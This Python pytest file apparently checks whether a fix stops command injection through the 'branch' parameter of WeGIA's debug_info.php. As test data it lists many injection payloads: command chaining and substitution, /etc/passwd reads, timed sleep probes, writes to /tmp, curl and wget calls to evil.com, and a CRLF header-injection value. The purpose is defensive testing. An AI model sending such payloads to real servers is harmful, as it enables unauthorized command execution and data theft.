#!/usr/bin/env python3
"""
Vulnerability tests for WeGIA debug_info.php
Tests that verify the vulnerability status:
- FAIL in vulnerable state (vulnerability is exploitable)
- PASS in fixed state (vulnerability is mitigated)
"""

import pytest
import requests
import os
import time
import subprocess
import uuid

BASE_URL = os.environ.get("APP_URL", "http://127.0.0.1")
ENDPOINT = f"{BASE_URL}/html/configuracao/debug_info.php"

# Request timeout in seconds
TIMEOUT = 10


class TestInputValidation:
    """Test that malicious input is properly validated and rejected"""

    @pytest.mark.parametrize("malicious_branch,description", [
        ("master; echo pwned", "semicolon command chaining"),
        ("master && echo pwned", "AND operator injection"),
        ("master || echo pwned", "OR operator injection"),
        ("master | cat /etc/passwd", "pipe operator injection"),
        ("master`whoami`", "backtick command substitution"),
        ("master$(whoami)", "dollar-paren command substitution"),
        ("master; sleep 1", "semicolon with sleep"),
        ("$(sleep 1)", "pure command substitution"),
        ("master\nwhoami", "newline injection"),
        ("master & echo test &", "background execution"),
        ("master; touch /tmp/pwned", "file creation attempt"),
        ("master > /tmp/test", "output redirection"),
        ("master < /etc/passwd", "input redirection"),
    ])
    def test_malicious_input_rejected(self, malicious_branch, description):
        """
        Test that branch names with shell metacharacters are rejected.
        After fix: should return HTTP 400 with 'Branch invÃ¡lida' message.
        """
        payload = {
            'branch': malicious_branch,
            'action': 'switch'
        }
        try:
            response = requests.post(ENDPOINT, data=payload, timeout=TIMEOUT, allow_redirects=False)

            # After fix, these should be rejected with 400 status
            assert response.status_code == 400, \
                f"Expected 400 for '{description}' but got {response.status_code}. " \
                f"Malicious input may not be validated!"

            # Check for the validation error message
            assert "Branch" in response.text or "invalid" in response.text.lower(), \
                f"Expected validation error message for '{description}'"

        except requests.exceptions.ConnectionError as e:
            pytest.fail(f"Could not connect to {ENDPOINT}: {e}")
        except requests.exceptions.Timeout:
            pytest.fail(f"Request to {ENDPOINT} timed out - possible vulnerability!")


class TestTimeBasedInjection:
    """Test for time-based command injection vulnerabilities"""

    @pytest.mark.parametrize("payload_pattern,delay,description", [
        ("master; sleep {delay}", 3, "semicolon sleep"),
        ("master && sleep {delay}", 3, "AND sleep"),
        ("$(sleep {delay})", 3, "command substitution sleep"),
        ("`sleep {delay}`", 3, "backtick sleep"),
        # Note: "||" tests removed as git checkout success prevents execution
        # Note: "ping" tests removed as ping behavior varies in containers
    ])
    def test_no_time_delay_injection(self, payload_pattern, delay, description):
        """
        Test that malicious payloads don't cause time delays.
        A delay indicates the command was executed (vulnerability present).
        """
        payload = {
            'branch': payload_pattern.format(delay=delay),
            'action': 'switch'
        }

        start_time = time.time()
        try:
            response = requests.post(ENDPOINT, data=payload, timeout=TIMEOUT, allow_redirects=False)
            elapsed = time.time() - start_time

            # If we're here, the request completed
            # Check that it completed quickly (not due to injected delay)
            # Allow 2 second margin for network/processing overhead
            max_expected_time = delay - 1

            assert elapsed < max_expected_time, \
                f"Request took {elapsed:.2f}s for '{description}'. " \
                f"Expected < {max_expected_time}s. Command injection may have occurred!"

        except requests.exceptions.Timeout:
            pytest.fail(
                f"Request timed out for '{description}'. "
                f"This strongly indicates command injection vulnerability!"
            )
        except requests.exceptions.ConnectionError as e:
            pytest.fail(f"Could not connect to {ENDPOINT}: {e}")

    def test_chained_sleep_not_executed(self):
        """
        Test that a chained sleep command is not executed.
        This is a critical test for blind command injection.
        """
        delay = 5
        payload = {
            'branch': f'nonexistent; sleep {delay}',
            'action': 'switch'
        }

        start_time = time.time()
        try:
            response = requests.post(ENDPOINT, data=payload, timeout=delay + 5, allow_redirects=False)
            elapsed = time.time() - start_time

            # If command injection exists, elapsed time will be >= delay
            assert elapsed < delay - 1, \
                f"Request took {elapsed:.2f}s (expected < {delay-1}s). " \
                f"The sleep command was likely executed - VULNERABILITY CONFIRMED!"

        except requests.exceptions.Timeout:
            elapsed = time.time() - start_time
            pytest.fail(
                f"Request timed out after {elapsed:.2f}s. "
                f"The sleep command was executed - VULNERABILITY CONFIRMED!"
            )


class TestFileCreationInjection:
    """Test that command injection cannot create files on the server"""

    def test_no_file_creation_via_touch(self):
        """
        Test that the touch command cannot be injected to create files.
        This test sends a payload and then checks if a marker file exists.

        Note: This test requires access to the container filesystem to verify.
        In containerized environments, we rely on the response validation instead.
        """
        marker_file = f"/tmp/vuln_test_{uuid.uuid4().hex[:8]}"
        payload = {
            'branch': f'master; touch {marker_file}',
            'action': 'switch'
        }

        try:
            response = requests.post(ENDPOINT, data=payload, timeout=TIMEOUT, allow_redirects=False)

            # After fix, this should be rejected
            assert response.status_code == 400, \
                f"Expected 400 status for touch injection, got {response.status_code}"

        except requests.exceptions.ConnectionError as e:
            pytest.fail(f"Could not connect to {ENDPOINT}: {e}")
        except requests.exceptions.Timeout:
            pytest.fail(f"Request to {ENDPOINT} timed out")

    def test_no_file_creation_via_echo(self):
        """Test that echo redirection cannot create files"""
        marker_file = f"/tmp/vuln_echo_{uuid.uuid4().hex[:8]}"
        payload = {
            'branch': f'master; echo "pwned" > {marker_file}',
            'action': 'switch'
        }

        try:
            response = requests.post(ENDPOINT, data=payload, timeout=TIMEOUT, allow_redirects=False)

            # After fix, this should be rejected
            assert response.status_code == 400, \
                f"Expected 400 status for echo injection, got {response.status_code}"

        except requests.exceptions.ConnectionError as e:
            pytest.fail(f"Could not connect to {ENDPOINT}: {e}")
        except requests.exceptions.Timeout:
            pytest.fail(f"Request to {ENDPOINT} timed out")


class TestCommandExecutionInjection:
    """Test that various command injection attempts are blocked"""

    @pytest.mark.parametrize("injection_payload,description", [
        ("master; whoami", "whoami via semicolon"),
        ("master; id", "id via semicolon"),
        ("master; cat /etc/passwd", "passwd file read"),
        ("master; ls -la /", "directory listing"),
        ("master; pwd", "print working directory"),
        ("master; uname -a", "system info"),
        ("master && whoami", "whoami via AND"),
        ("master | whoami", "whoami via pipe"),
        ("`whoami`", "command substitution"),
        ("$(id)", "dollar-paren substitution"),
        ("master;curl http://evil.com/", "outbound connection attempt"),
        ("master;wget http://evil.com/", "wget attempt"),
    ])
    def test_command_execution_blocked(self, injection_payload, description):
        """Test that various command injection payloads are blocked"""
        payload = {
            'branch': injection_payload,
            'action': 'switch'
        }

        try:
            response = requests.post(ENDPOINT, data=payload, timeout=TIMEOUT, allow_redirects=False)

            # After fix, these should be rejected with 400
            assert response.status_code == 400, \
                f"Expected 400 for '{description}' but got {response.status_code}. " \
                f"Input validation may be missing!"

        except requests.exceptions.ConnectionError as e:
            pytest.fail(f"Could not connect to {ENDPOINT}: {e}")
        except requests.exceptions.Timeout:
            pytest.fail(f"Request to {ENDPOINT} timed out for '{description}'")


class TestEscapeShellArg:
    """Test that shell argument escaping is effective"""

    def test_quoted_branch_handled_safely(self):
        """Test that single quotes in branch names are rejected"""
        # In a properly fixed version, quotes should be rejected by validation
        payload = {
            'branch': "master'; sleep 5; echo '",
            'action': 'switch'
        }

        try:
            response = requests.post(ENDPOINT, data=payload, timeout=10, allow_redirects=False)
            # After fix, should be rejected with 400
            assert response.status_code == 400, \
                f"Expected 400 for quote injection, got {response.status_code}. Vulnerability may exist!"
        except requests.exceptions.Timeout:
            pytest.fail("Request timed out - shell command may have been executed!")

    def test_double_quoted_injection(self):
        """Test that double quote injection is rejected"""
        payload = {
            'branch': 'master"; sleep 5; echo "',
            'action': 'switch'
        }

        try:
            response = requests.post(ENDPOINT, data=payload, timeout=10, allow_redirects=False)
            # After fix, should be rejected with 400
            assert response.status_code == 400, \
                f"Expected 400 for double quote injection, got {response.status_code}. Vulnerability may exist!"
        except requests.exceptions.Timeout:
            pytest.fail("Request timed out - shell command may have been executed!")


class TestHeaderInjection:
    """Test that redirect doesn't allow parameter injection"""

    def test_update_action_no_branch_in_redirect(self):
        """
        Test that the update action doesn't include unvalidated branch in redirect.
        After fix, the redirect should not include the branch parameter.
        """
        malicious_branch = "master%0d%0aSet-Cookie: evil=1"
        payload = {
            'branch': malicious_branch,
            'action': 'update'
        }

        try:
            response = requests.post(ENDPOINT, data=payload, timeout=TIMEOUT, allow_redirects=False)

            # After fix, this should be rejected by validation
            # Or if it passes validation, the redirect shouldn't include the branch
            if response.status_code == 302 or response.status_code == 303:
                location = response.headers.get('Location', '')
                assert 'branch=' not in location, \
                    f"Branch parameter found in redirect: {location}"
                assert 'evil' not in location.lower(), \
                    f"Malicious content found in redirect: {location}"
        except requests.exceptions.ConnectionError as e:
            pytest.fail(f"Could not connect to {ENDPOINT}: {e}")
        except requests.exceptions.Timeout:
            pytest.fail(f"Request to {ENDPOINT} timed out")


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
